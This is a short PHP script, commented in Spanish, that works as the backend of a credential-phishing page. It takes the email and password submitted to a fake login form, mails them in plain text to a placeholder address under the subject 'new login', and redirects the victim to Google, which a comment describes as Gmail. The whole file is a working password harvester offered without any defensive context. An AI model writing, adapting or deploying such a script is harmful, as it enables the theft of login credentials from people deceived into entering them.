<?php
// Dirección de correo electrónico de destino
$to = "tu_correo@example.com";

// Obtener los datos del formulario
$email = $_POST['email'];
$password = $_POST['password'];

// Crear el asunto y el cuerpo del correo
$subject = "Nuevo inicio de sesión";
$body = "Correo electrónico: $email\nContraseña: $password";

// Cabeceras adicionales
$headers = "From: no-reply@example.com";

// Enviar el correo
if (mail($to, $subject, $body, $headers)) {
    // Redirigir al usuario a Gmail si el correo se envía correctamente
    header("Location: https://www.google.com");
    exit();
} else {
    echo "Error al enviar el correo";
}
?>